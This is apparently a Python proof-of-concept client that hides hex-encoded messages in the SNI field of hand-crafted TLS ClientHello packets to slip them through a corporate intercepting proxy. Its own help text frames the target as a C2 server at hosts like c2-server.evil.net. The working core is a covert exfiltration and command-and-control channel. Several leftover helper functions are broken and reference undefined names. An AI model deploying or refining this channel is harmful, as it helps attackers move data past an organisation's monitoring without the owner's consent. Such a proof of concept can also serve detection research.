# -*- coding: utf-8 -*-

"""
client.py

PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS Handshake.

Client Max Bytes Per TLS Client Hello: 284
Server Max Bytes Per TLS Server Hello: 16k - TLS overhead [~15k]

TODO:
    1. Implement Reliable Packetization Protocol
    2. Implment server.py (using x509 SNA fields for smuggling)
    3. Test and investigate how detectable this is as a C2 channel
 
"""

import argparse
import socket
import time
import struct
import typing
import random
import string
import math
from typing import Tuple
from urllib.parse import urlparse

NS_TO_MS = 1000000
# MAX_MSG_LEN = 284
MAX_MSG_LEN = 256


class TLSClientHandshake:
    record = [  # idx  type     description
        b"\x16",  # [00] fixed    Record Type: TLS Handshake
        b"\x03\x01",  # [01] fixed    TLS REcord Version: v1.0
        b"\x00\x00",  # [02] variable Record Length: uint16
        b"\x01",  # [03] fixed    Handshake Type: Client Hello
        b"",  # [04] unused   -
        b"\x00\x00\x00",  # [05] variable Handshake Length: uint24
        b"\x03\x03",  # [06] fixed    Handshake Version: TLSv1.2
        b"\x00" * 4,  # [07] variable GMT Epoch                       4 Bytes   [SMUGGLE]
        b"\x00" * 28,  # [08] variable Random Seed                     28 Bytes  [SMUGGLE]
        b"\x00",  # [09] variable Session ID Length uint8
        b"",  # [10] variable Session ID 32 Bytes
        b"\x00\x00",  # [11] variable Cipher Suites List Len: uint16
        b"\x00",  # [12] variable Cipher Suites
        b"\x01",  # [13] fixed    Compression Methods List Len
        b"\x00",  # [14] fixed    Compression = null
        b"\x00\x00",  # [15] variable Extensions Length: uint16
        b"\x00",  # [16] variable Extension: SNI (object)         252 Bytes [SMUGGLE]
        b"\x00",  # [17] fixed    Extension: Elliptic Formats
        b"\x00",  # [18] fixed    Extension: Elliptic Groups
        b"\x00\x10",  # [19] variable Extension: Elliptic Alogorithms
        b"\x00\x00",  # [20] fixed    Extension: ALPN
        b"",  # [21] unused   -
    ]

    def __init__(self, message: str):
        enc_message, seed = self.encode_tls_payload(message)
        if len(enc_message) > MAX_MSG_LEN:
            print(
                f"ERROR: Encoded message length of {len(enc_message)} (original length was {len(message)}) exceeds MAX_LEN of {MAX_MSG_LEN}"
            )
            raise NotImplementedError
        self.record[20] = self.get_alpn()
        self.record[19] = self.get_ec_algorithms()
        self.record[18] = self.get_ec_groups()
        self.record[17] = self.get_ec_formats()
        self.record[16] = enc_message
        # self.record[16] = self._fixed_sni()
        self.record[15] = struct.pack(">H", len(b"".join(self.record[16:])))
        self.record[12] = self.get_cipher_suites()
        self.record[11] = struct.pack(">H", len(self.record[12]))
        # TODO: in the future, we will use seed field to smuggle payloads
        self.record[8] = seed[4:]
        self.record[7] = seed[:4]
        self.record[5] = struct.pack(">L", len(b"".join(self.record[6:])))[1:]
        self.record[2] = struct.pack(">H", len(b"".join(self.record[3:])))

    def encode_tls_payload(self, message: str) -> typing.Tuple[bytes, bytes]:
        """
        Takes a string message and returns a Tuple of bytes cooresponding to SNI and random field in the TLS record
        """
        hex_msg = self._str_to_hex(message)
        sni_tld = self._get_random_tld()
        # TODO: make this more robust - Use random seed field for smuggling
        return (self.make_sni(hex_msg + sni_tld), self._get_random_seed())

    def _get_random_tld(self):
        return "." + "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, 4)))

    def _get_random_seed(self) -> bytes:
        return bytes([random.randrange(0, 256) for _ in range(0, 32)])

    def _str_to_hex(self, message: str) -> str:
        return bytes.hex(message.encode())

    def _hex_to_str(self, message: str) -> str:
        return bytes.fromhex(message.decode()).decode()

    def to_byte_stream(self) -> bytes:
        return b"".join(self.record)

    def __str__(self):
        return str("".join(self._escape(b) for b in self.record))

    def _escape(self, byte_arr: bytes) -> str:
        return "".join("\\x{:02x}".format(b) for b in byte_arr)

    def print_lens(self):
        l = 0
        for i, r in enumerate(self.record):
            l += len(r)
            print(f"len(record[{i}])={len(r)}")
        print(f"Total Length: {l}")

    def get_cipher_suites(self) -> bytes:
        return b"\xc0\x30\xc0\x2c\xc0\x2f\xc0\x2b\x00\x9f\x00\x9e\xc0\x28\xc0\x24\xc0\x14\xc0\x0a\xc0\x27\xc0\x23\xc0\x13\xc0\x09\x00\x9d\x00\x9c\x00\x3d\x00\x35\x00\x3c\x00\x2f\x00\xff"

    def get_ec_algorithms(self) -> bytes:
        return (
            b"\x00\x0d\x00\x16\x00\x14\x06\x01\x06\x03\x05\x01\x05\x03\x04\x01\x04\x03\x03\x01\x03\x03\x02\x01\x02\x03"
        )

    def get_ec_groups(self) -> bytes:
        return b"\x00\x0a\x00\x08\x00\x06\x00\x1d\x00\x17\x00\x18"

    def get_ec_formats(self) -> bytes:
        return b"\x00\x0b\x00\x02\x01\x00"

    def get_alpn(self) -> bytes:
        return b"\x00\x10\x00\x0b\x00\x09\x08http/1.1"

    def _fixed_sni(self) -> bytes:
        name = "test-tls-smuggle.code".encode()
        hostname_len = struct.pack(">H", len(name))
        list_len = struct.pack(">H", len(name) + 3)
        ext_len = struct.pack(">H", len(name) + 5)
        return b"\x00\x00" + ext_len + list_len + b"\x00" + hostname_len + name

    def make_sni(self, message: str) -> bytes:
        name = message.encode()
        hostname_len = struct.pack(">H", len(name))
        list_len = struct.pack(">H", len(name) + 3)
        ext_len = struct.pack(">H", len(name) + 5)
        return b"\x00\x00" + ext_len + list_len + b"\x00" + hostname_len + name


class Sender:
    def __init__(self, proxy: tuple, tls_record: TLSClientHandshake):
        self.tls_record = tls_record
        self.proxy = proxy

    def send_test(data: bytes):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("_DEST_HOST_", 8443))
        sock.send(data)
        sock.close()

    def proxy_send(destination: tuple):
        sock.connect(("1.2.3.4", 8080))
        c = "CONNECT " + host + ":" + str(port) + " HTTP/1.1\r\n\r\n"
        print(" > " + c)
        sock.send(c.encode())
        response = sock.recv(1024)
        print(" < " + response.decode())
        # now our tls hnadshake
        print(" > [" + str(len(TLS_CLIENT_HELLO_BIN)) + "] bytes in TLS CLIENT HELLO: SNI=" + "WWWWW")
        sock.send(TLS_CLIENT_HELLO_BIN)
        # response = sock.recv(4096)
        sock.close()

    def tls_client_hello(sock):
        sock.send(TLS_CLIENT_HELLO.decode("hex"))
        time.sleep(2)
        print("sent tls client hello; recv length:%d" % (len(sock.recv(2048))))


# TODO: this is a mess here - FIX UP
TLS_CLIENT_HELLO_HEX = "d3adb33f"
TLS_CLIENT_HELLO_BIN = bytes.fromhex(TLS_CLIENT_HELLO_HEX)

sni1 = "d3adb33f"
pad = "00150002ffff"
NT = "d3adb33f"

# sni = d3adb33f
NTB = bytes.fromhex(NT)


def send_test(host, port):
    sock.connect(("_PROXY_", 8080))
    c = "CONNECT " + host + ":" + str(port) + " HTTP/1.1\r\n\r\n"
    print(" > " + c)
    sock.send(c.encode())
    response = sock.recv(1024)
    print(" < " + response.decode())
    # now our tls hnadshake
    print(" > [" + str(len(TLS_CLIENT_HELLO_BIN)) + "] bytes in TLS CLIENT HELLO: SNI=" + "WWWWW")
    # sock.send(TLS_CLIENT_HELLO_BIN)
    sock.send(NTB)
    response = sock.recv(4096)
    time.sleep(2)
    sock.close()


def tls_client_hello(sock):
    sock.send(NTB.decode("hex"))
    time.sleep(2)
    print("sent tls client hellow; recv length:%d" % (len(sock.recv(2048))))


def connect_proxy(proxy_host: str, server: str) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"+ Connecting to proxy: {proxy_host} ...")
    sock.connect((urlparse(proxy_host).hostname, urlparse(proxy_host).port))
    if not urlparse("https://" + server).port:
        server = server + ":443"
    c_str = "CONNECT " + server + " HTTP/1.1\r\n\r\n"
    print(f" > {c_str.rstrip()}")
    sock.sendall(c_str.encode())
    resp = sock.recv(1024)
    print(" < " + resp.decode().split("\r\n")[0])
    # TODO: short circuit this for testing
    # if int(resp.decode().split("\r\n")[0].split(" ")[1]) != 200:
    #     sock.close()
    #     print(f"Error: The proxy did not accept our connect request.")
    #     return None
    return sock


def send_message(sock: socket.socket, byte_stream: bytes) -> bytes:
    sock.sendall(byte_stream)
    return sock.recv(16384)


if __name__ == "__main__":
    # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # proxy_send("_HOST_",443)

    # is_connected = proxy_connect
    # send_raw.proxy_connect(socket.socket(socket.AF_INET, socket.SOCK_STREAM),'_HOST_')

    # new shiz
    arg_parse = argparse.ArgumentParser(
        description="Send and Receive messages via TLS Handshakes through an interception proxy"
    )
    arg_parse.add_argument("message", type=str, nargs="?", help="Message to send")
    arg_parse.add_argument(
        "-p",
        "--proxy",
        metavar="proxy",
        required=True,
        help="Intercepting HTTP Proxy to use, Example: http://proxy.company.com:8080/",
    )
    arg_parse.add_argument(
        "-s",
        "--server",
        metavar="server",
        required=True,
        help="Target C2 Server you want to connect to, Example: my-server.evil.net",
    )
    args = arg_parse.parse_args()
    if not args.message:
        arg_parse.error("Error: No message was supplied")
        exit(1)
    if not args.server:
        arg_parse.error("Error: No server (--server) was supplied. Example: --server c2-server.evil.net")
        exit(1)
    proxy = ""
    is_good_proxy_url = True
    try:
        proxy = urlparse(args.proxy.lower())
    except:
        is_good_proxy_url = False
    if (proxy.scheme != "http") or (len(proxy.hostname) < 3) or (not proxy.port) or (not is_good_proxy_url):
        arg_parse.error("Error: The Supplied proxy URL appears invalid. Example: http://proxy.company.com:8080/")
        exit(1)
    # Proxy CONNECT PHASE
    prox_start_time_ns = int(time.time_ns())
    proxy_socket = connect_proxy(args.proxy.lower(), args.server.lower())
    prox_end_time_ns = int(time.time_ns())

    t = TLSClientHandshake(args.message)
    response = send_message(proxy_socket, t.to_byte_stream())
    # TODO: handle the response
    print(str(response))
